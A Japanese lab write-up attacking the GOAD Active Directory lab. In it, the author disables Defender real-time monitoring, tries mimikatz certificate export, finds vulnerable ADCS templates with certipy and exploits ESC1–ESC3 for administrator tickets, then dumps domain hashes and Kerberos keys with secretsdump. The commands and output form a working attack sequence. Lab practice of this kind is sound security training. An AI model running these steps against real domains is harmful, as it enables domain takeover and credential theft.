---
title: "GOAD Writeup Ch3"
date: "2024-10-26"
draft: "false"
---

## Round 3

meereenの認証情報を`Administrator/P@ssw0rd!` にした。

meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。

### THEFT 1  Exporting certificates using the CryptoAPI

mimikatz.exeを用いて証明書を窃取する。

と思ったけどWindows Defenderでmimikatzが検知される。

khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。

```
*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\khal.drogo\Documents> whoami 
essos\khal.drogo

*Evil-WinRM* PS C:\Users\khal.drogo\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
```

これでmimikatz.exeを実行してみる

```
*Evil-WinRM* PS C:\Users\khal.drogo\Documents> ./mimikatz.exe "crypto::certificates /export" "crypto::capi" "crypto::certificates /export" "exit"

  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # crypto::certificates /export
 * System Store  : 'CURRENT_USER' (0x00010000)
 * Store         : 'My'

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz(commandline) # crypto::certificates /export
 * System Store  : 'CURRENT_USER' (0x00010000)
 * Store         : 'My'

mimikatz(commandline) # exit
Bye!

```

何も出てこないし、pfxとか盗めん…。

仕方がない別のアプローチで攻撃する

### Domain Privilege escalation

適当にESC1-8あたりを試してみる

ESCが何かはSpectoropsの資料がよくまとまっている

https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf

```
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad find -u 'khal.drogo' -p horse -dc-ip 192.168.56.12 -vulnerable -enabled                             
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 38 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
[*] Got CA configuration for 'ESSOS-CA'
[*] Saved BloodHound data to '20241023161533_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20241023161533_Certipy.txt'
[*] Saved JSON output to '20241023161533_Certipy.json'
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/braavos]
└─$ cat 20241023161533_Certipy.txt                                                    
Certificate Authorities
  0
    CA Name                             : ESSOS-CA
    DNS Name                            : braavos.essos.local
    Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
    Certificate Serial Number           : 5120F6B8733E26BC43F390382A65D06B
    Certificate Validity Start          : 2024-08-11 03:37:50+00:00
    Certificate Validity End            : 2029-08-11 03:47:49+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : ESSOS.LOCAL\Administrators
      Access Rights
        ManageCertificates              : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        ManageCa                        : ESSOS.LOCAL\Administrators
                                          ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Enterprise Admins
        Enroll                          : ESSOS.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : ESC4
    Display Name                        : ESC4
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\khal.drogo
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : 'ESSOS.LOCAL\\khal.drogo' has dangerous permissions
  1
    Template Name                       : ESC3-CRA
    Display Name                        : ESC3-CRA
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  2
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC2                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template can be used for any purpose
      ESC3                              : 'ESSOS.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
  3
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : ESSOS-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ESSOS.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : ESSOS.LOCAL\Enterprise Admins
        Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
        Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                          ESSOS.LOCAL\Local System
                                          ESSOS.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

```

ラボ環境だから当たり前といえば当たり前だがESC1-8で遊べそう。

### ESC1

```
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC1 -upn 'administrator@essos.local'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/braavos]
└─$ ls
20241023161533_Certipy.json  20241023161533_Certipy.txt  20241023161533_Certipy.zip  administrator.ccache  administrator.pfx  asreproast.hash  braavos.nmap  missandei.ccache
```

というわけでadministratorのTGTゲット

### ESC 2

```
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC2
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'khal.drogo.pfx'
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad auth -pfx khal.drogo.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: khal.drogo@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'khal.drogo.ccache'
[*] Trying to retrieve NT hash for 'khal.drogo'
[*] Got hash for 'khal.drogo@essos.local': aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021
```

ESC2もできた

### ESC 3

```
──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3-CRA
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'khal.drogo.pfx'
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad req -u 'khal.drogo@essos.local' -p 'horse' -dc-ip 192.168.56.12 -target 192.168.56.23 -ca 'ESSOS-CA' -template ESC3 -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b
```

はい、またadministratorのTGT取得

もうadministratorのTGT取得できているので他のESCなんとかは試さない

あとはadministratorのチケットを使って色々する

```
┌──(kali㉿kali)-[~/goad/braavos]
└─$ export KRB5CCNAME=administrator.ccache

┌──(kali㉿kali)-[~/goad/braavos]
└─$ impacket-secretsdump -k meereen.essos.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x27f348488bf565282d6c09846f0b195a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ESSOS\MEEREEN$:plain_password_hex:6b9ebce56793e6984d7266005fafa1f19d404568425240aafdf3116c41ff945d128492d874640bd5ab6fe258c5daa085efb6dbc11cdc7d700cc45ddfddbb540acbf581788f0cfe49eb4675b059247a769ea05bff6a0ea5f8af86a5d8ab766556e688ef3be8302fe626616556244d22ae97417048fe9189e84d1193b77e318de5267b06aed27911237586b80a91ffc17312e7e561757eea0fa1b5ebac4c3a8e21252b4e611e7a92da00c94dd307dc86bc4e239b176c063255e46538009d5f5b6e0349504934361304c7e6ef99c50e33bc9c1d55832c996ad416f377ed86c861ac11787a24cbfa8ed3622ab7b49d89b32a
ESSOS\MEEREEN$:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8a316db332fd5d07200bd16c0c178e3cde2ecf31
dpapi_userkey:0xb1c344e7203277156a6b15782a58e16577349587
[*] NL$KM 
 0000   48 12 38 16 FC 21 D8 4B  13 02 2E EF A9 E1 B3 FF   H.8..!.K........
 0010   C8 F3 E1 9B 62 AC A5 2C  F8 3E 07 1B 66 C5 93 AD   ....b..,.>..f...
 0020   06 16 32 5D 1D 00 C0 84  9B EF 1F 84 1C B1 E3 F3   ..2]............
 0030   41 8A ED 9D 0A 6A 75 6F  EC 7B D9 79 CF 8E 24 D9   A....juo.{.y..$.
NL$KM:48123816fc21d84b13022eefa9e1b3ffc8f3e19b62aca52cf83e071b66c593ad0616325d1d00c0849bef1f841cb1e3f3418aed9d0a6a756fec7bd979cf8e24d9
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54798535f08dafb2f3ab805bb312961d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
essos.local\viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
pnightmare:1121:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:0d8d114e49ff85a35b3c97208d88dcf3:::
gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:563b455a419089dfbfa829cab9f2b174:::
removemiccomputer$:1120:aad3b435b51404eeaad3b435b51404ee:1e986d18a9b7c9543e2d57944e8656b7:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:743ab45cdf64d2f368f501fd348ab3d8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7fe27604209f1b09a5e6b65dc787322c276ad68b6f8c4d031330ba1d2cf92e0a
Administrator:aes128-cts-hmac-sha1-96:ae2bd7bb7370fab76dbce7574775785d
Administrator:des-cbc-md5:c43b5d5e049e5dc4
krbtgt:aes256-cts-hmac-sha1-96:cbaf94c62ef0df4e9aca570d91669ef363202474c280c40a32356d1fe43d2936
krbtgt:aes128-cts-hmac-sha1-96:d3772f8394664311fa4f2aa721604b98
krbtgt:des-cbc-md5:074ae0d549492af7
daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
essos.local\viserys.targaryen:aes256-cts-hmac-sha1-96:2b64ffb14425909795d5c1bfecf9ff2a55423bdfbf2b7b33aece337c6f180950
essos.local\viserys.targaryen:aes128-cts-hmac-sha1-96:d96686a26adc498b3409d97241cc7112
essos.local\viserys.targaryen:des-cbc-md5:1ab38c86518c2a97
khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
khal.drogo:des-cbc-md5:b5ec4c1032ef020d
jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
jorah.mormont:des-cbc-md5:b926916289464ffb
missandei:aes256-cts-hmac-sha1-96:41d08ceba69dde0e8f7de8936b3e1e48ee94f9635c855f398cd76262478ffe1c
missandei:aes128-cts-hmac-sha1-96:0a9a4343b11f3cce3b66a7f6c3d6377a
missandei:des-cbc-md5:54ec15a8c8e6f44f
drogon:aes256-cts-hmac-sha1-96:2f92317ed2d02a28a05e589095a92a8ec550b5655d45382fc877f9359e1b7fa1
drogon:aes128-cts-hmac-sha1-96:3968ac4efd4792d0acef565ac4158814
drogon:des-cbc-md5:bf1c85a7c8fdf237
sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
sql_svc:des-cbc-md5:91d6b0df31b52a3d
pnightmare:aes256-cts-hmac-sha1-96:08da34ebff1dd974ef4694a80381ba0b91053db8c1ff3408c49b1ec870a355ae
pnightmare:aes128-cts-hmac-sha1-96:1e52001e6c4555756489ac2632ff1920
pnightmare:des-cbc-md5:5ef4f1d368f476ab
MEEREEN$:aes256-cts-hmac-sha1-96:c2ba7282441e5fab1d0937a079b8d16fe707635b3dc418eecc1dcfec0b678f7e
MEEREEN$:aes128-cts-hmac-sha1-96:61f0538c8597abbd7af90fe4b4734eb8
MEEREEN$:des-cbc-md5:7c15d3bfb06b8302
BRAAVOS$:aes256-cts-hmac-sha1-96:2a38c6d026c43cc520f37c5fa68c99563351418cb96bcf2131bfeb8077c4681c
BRAAVOS$:aes128-cts-hmac-sha1-96:7997ad6ca029027905198cdc9b0fb3ed
BRAAVOS$:des-cbc-md5:c17a85c823794acb
gmsaDragon$:aes256-cts-hmac-sha1-96:b073af95cf4be2fed876f5d301b2db7ac07b60d9973a3877f4c36af32d2901d8
gmsaDragon$:aes128-cts-hmac-sha1-96:92983daf8288a8ae5a75a6d231f0b442
gmsaDragon$:des-cbc-md5:267c20ce62405ed5
removemiccomputer$:aes256-cts-hmac-sha1-96:8f6354675bc4054f4fd28efa73e3d37239a6f8bb38985c2317050e8c4d45c958
removemiccomputer$:aes128-cts-hmac-sha1-96:2b1e79379afb5995ded695e06e042d3f
removemiccomputer$:des-cbc-md5:c1e0f47c20e3d307
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:76c85f04bb423f39eb02246748da52eb85f4883dfa6f75b039fe84c1e632d070
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:34cc6de4b34d71da64939577e88a41e4
SEVENKINGDOMS$:des-cbc-md5:34dc49029dd96179
[*] Cleaning up...
```

クレデンシャルダンプした
今回はこれで終わり